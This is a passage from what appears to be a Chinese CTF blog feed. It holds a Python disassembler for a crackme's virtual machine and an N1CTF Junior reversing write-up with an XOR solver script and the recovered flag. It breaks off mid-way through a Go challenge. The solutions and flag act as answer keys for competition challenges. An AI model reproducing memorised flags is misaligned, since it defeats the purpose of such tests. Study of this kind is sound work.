data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[2]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[3]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">alu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"add reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"sub reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mul reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"xor reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"shl reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"shr reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"164\"></td><td><pre></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmp reg[0],reg[1]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre></pre></td></tr><tr><td data-num=\"169\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">jmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>   <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"172\"></td><td><pre></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"jmp </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>   ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre></pre></td></tr><tr><td data-num=\"177\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">jne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"180\"></td><td><pre></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"jne </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre></pre></td></tr><tr><td data-num=\"185\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">je</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"je </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre></pre></td></tr><tr><td data-num=\"193\"></td><td><pre><span class=\"token keyword\">while</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token number\">255</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>​       mov<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>​       push<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>​       pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>​      alu<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>​      <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>​      jmp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">6</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>​      jne<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">7</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre></pre></td></tr><tr><td data-num=\"227\"></td><td><pre>​      je<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行结果</p>\n<p><img data-src=\"/images/image-20230213195038779.png\" alt=\"image.png\"></p>\n<p>首先 data [0] 到 data [39] 共 40 个数据为输入的 flag  分析这 39 行汇编知操作为:</p>\n<p>可看出逻辑为加 data [50+i]，异或 data [100+i]，左移 8 位 + 右移 8 位，并与 data [150+i] 逆序（因为加密后结果存放在栈中）进行比较，写解密代码即可:</p>\n<p><img data-src=\"/images/image-20230213195738789.png\" alt=\"image.png\"></p>\n<p>总结:</p>\n<p>这里方法是手写反汇编器还原虚拟机的指令 算是比较严谨的做法了顺便学习 VM 的基础吧 貌似可以动态调试来做？</p>\n<p>虚拟机题型的关键在于分析出来虚拟机的数据结构，如寄存器，栈，内存等。在分析过程中能把寄存器在 IDA 中表示出来是最好的 (方便看，如题中分析出是结构体), 要把关键寄存器如 rip 先分析出来</p>\n<p>题中<s> input</s> (也就是脚本中的 data) 那个大数组其实就相当于栈，内存这种类似的存在了 就是一个空间</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/04/N1CTF%20Junior%20%20WP%20%20by%203cly/",
            "url": "https://3cly.github.io/2023/02/04/N1CTF%20Junior%20%20WP%20%20by%203cly/",
            "title": "N1CTF Junior  WP",
            "date_published": "2023-02-04T05:02:58.000Z",
            "content_html": "<h1 id=\"n1ctf-junior-wp\"><a class=\"markdownIt-Anchor\" href=\"#n1ctf-junior-wp\">#</a> N1CTF Junior  WP</h1>\n<h2 id=\"reserve\"><a class=\"markdownIt-Anchor\" href=\"#reserve\">#</a> reserve</h2>\n<h3 id=\"checkin-rs\"><a class=\"markdownIt-Anchor\" href=\"#checkin-rs\">#</a> checkin-rs</h3>\n<h4 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h4>\n<p>拿到文件 由题目标题知是 rust 语言编写的 之前没接触过 rust 的逆向题只好硬着头皮先放进 IDA 看看<br>\n<img data-src=\"/images/n1.png\" alt=\"image.png\"><br>\n 首先搜索 main 函数 找到这个带有字符串的函数就是主函数了<br>\n<img data-src=\"/images/n2.png\" alt=\"image.png\"><br>\nv0 先是赋值了 32 字节 又 cpy 了 14 字节 总共是 46 字节 通过动调和 lazyIDA 可提取出来<br>\n [0x7D, 0x20, 0x23, 0x22, 0x25, 0x24, 0x68, 0x72, 0x6E, 0x56, 0x79, 0x62, 0x53, 0x79, 0x7D, 0x7A, 0x62, 0x4E, 0x7C, 0x7A, 0x7F, 0x76, 0x73, 0x7F, 0x7B, 0x46, 0x7F, 0x68, 0x6E, 0x78, 0x68, 0x7A, 0x52, 0x7E, 0x5B, 0x50, 0x45, 0x40, 0x5D, 0x4C, 0x46, 0x5C, 0x5A, 0x48, 0x49, 0x5E]<br>\n 最后面这部分应该对解题帮助不大 就是判断输入之后的成功或失败 然后释放前面使用的内存什么的<br>\n<img data-src=\"/images/n3.png\" alt=\"image.png\"></p>\n<p>中间部分的前面是有关线程使用的一些判断，正常情况没有报错就不会执行<br>\n<img data-src=\"/images/n4.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n5.png\" alt=\"image.png\"><br>\n 后面的多线程就是关键了<br>\n<img data-src=\"/images/n6.png\" alt=\"image.png\"><br>\n 对这部分 我昨天动态调试了很久没有看懂 然后 hint1 放出来了 于是去 rust 官网下载了 rust 在 VScode 上编译了一个多线程 rust 程序放进 IDA 看看 要能找到线程 handler 就能找到关键<br>\n<img data-src=\"/images/n7.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n8.png\" alt=\"image.png\"> 然后查看 main 函数就发现 sub_1400027B0 是 main 函数 sub_140002EB0 就是 handler 相关的<br>\n这时准备开摆了 放出了第二个 hint 叫我们在 bcmp 函数下断点观察输入的变化 就是黑盒分析吧<br>\n<img data-src=\"/images/n9.png\" alt=\"image.png\"><br>\nv23 是加密后的输入<br>\n通过很多次尝试 (比如输入 46 个 1，16 个 1 后面是 2，secpunk {},secpunk {11111} 之类的)<br>\n<img data-src=\"/images/n10.png\" alt=\"image.png\"><br>\n 发现输入的字符串加密后最后一个字符经过加密后是不变的<br>\n<img data-src=\"/images/n11.png\" alt=\"image.png\"><br>\n 发现前面的 v26 就是输入  v25 是加密后的数据 v24 又递加<br>\n<img data-src=\"/images/n12.png\" alt=\"image.png\"><br>\n 最后一个字符没变就是异或 0 于是就试了 0-45 的异或比较数据 直接得出 flag</p>\n<h4 id=\"脚本\"><a class=\"markdownIt-Anchor\" href=\"#脚本\">#</a> 脚本</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>kkk<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token operator\">=</span>kkk</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    kkk<span class=\"token operator\">=</span>kkk<span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin\">str</span><span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token builtin\">str</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#因为 lazyIDA 提取数据的原因前面异或之后是倒序后面再倒过来</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token triple-quoted-string string\">'''运行结果:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>46</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>[125, 33, 33, 33, 33, 33, 110, 117, 102, 95, 115, 105, 95, 116, 115, 117,</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>114, 95, 110, 105, 107, 99, 101, 104, 99, 95, 101, 115, 114, 101, 118, 101,</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>114, 95, 121, 115, 97, 101, 123, 107, 110, 117, 112, 99, 101, 115]</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>secpunk&#123;easy_reverse_checkin_rust_is_fun!!!!!&#125;</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Process finished with exit code 0</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>'''</pre></td></tr></table></figure><h2 id=\"n0th1ngg0\"><a class=\"markdownIt-Anchor\" href=\"#n0th1ngg0\">#</a> n0th1ngG0</h2>\n<h3 id=\"题目分析-2\"><a class=\"markdownIt-Anchor\" href=\"#题目分析-2\">#</a> 题目分析</h3>\n<p n1_jun10r_2023_1s_4w3s0m3>开始做的时候附件已经更新过了 直接下载的简单版本<br>\n同时题目描述说了如果认识这个算法就直接冲 推测应该是某种加密算法<br>\n 2 个版本我直接把 windows 版放进 IDA<br>\n<img data-src=\"/images/n13.png\" alt=\"image.png\"><br>\n 这里注意 go 语言逆向题 main 函数是 main_main<br>\n<img data-src=\"/images/n14.png\" alt=\"image.png\"><br>\n 关键就是中间的 main_crypto_Crypt 了 这里发现了 2 段常量字符数组 一段为密钥一段为比较数据<br>\n<img data-src=\"/images/n15.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n16.png\" 